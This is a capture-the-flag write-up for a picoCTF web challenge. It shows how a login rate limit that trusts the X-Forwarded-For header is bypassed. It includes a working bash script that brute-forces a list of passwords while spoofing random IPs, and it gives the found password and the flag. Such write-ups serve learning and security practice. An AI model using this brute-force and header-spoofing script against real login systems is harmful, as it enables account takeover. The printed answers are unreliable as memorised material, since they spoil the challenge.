# Crack the Gate 2

## Category
Web Exploitation

## Difficulty
Medium

## Description
A login system with rate-limiting that turned out to be easily bypassed.

## What is that?
The login page at `POST /login` had a few things going on:
- Rate-limiting to stop brute-force attacks
- Fixed username: `ctf-player@picoctf.org`
- Password list with 20 candidates

## What fucked up
The app used `X-Forwarded-For` headers to track IPs for rate-limiting. That's it. Just a header anyone can set.

## Exploit

`X-Forwarded-For` is supposed to help proxies identify client IPs. By sending random IPs in this header, every request looked like it came from somewhere new.

The Script:
```bash
PASSWORDS="GD3sx5Iw
ImpUIm8A
PTB1lPnt
cZQk5dKb
ScE1RSSg
6ANZhGC3
fOs08aPG
BUJ8xCeJ
6eB8FaoN
oNbpNg5z
m71fz6t1
lvtkWGgm
lpYlqvmj
GanofYft
G9Wym7Uh
gMtYtScr
yH6hasWP
EphhZ8nE
Plgh3qpz
GC6nTzOn"

echo "$PASSWORDS" | while IFS= read -r password; do
  IP="192.168.1.$((RANDOM % 255 + 1))"
  RESPONSE=$(curl -s -X POST http://amiable-citadel.picoCTF.net:54550/login \
    -H "Content-Type: application/json" \
    -H "X-Forwarded-For: $IP" \
    -d "{\"email\":\"ctf-player@picoctf.org\",\"password\":\"$password\"}")
  if echo "$RESPONSE" | grep -q "success.*true"; then
    echo "FOUND! Password: $password"
    echo "$RESPONSE"
  fi
done
```

**The Result**: Password was `oNbpNg5z`.

## Flag
```
picoCTF{xff_byp4ss_brut3_1663a1a8}
```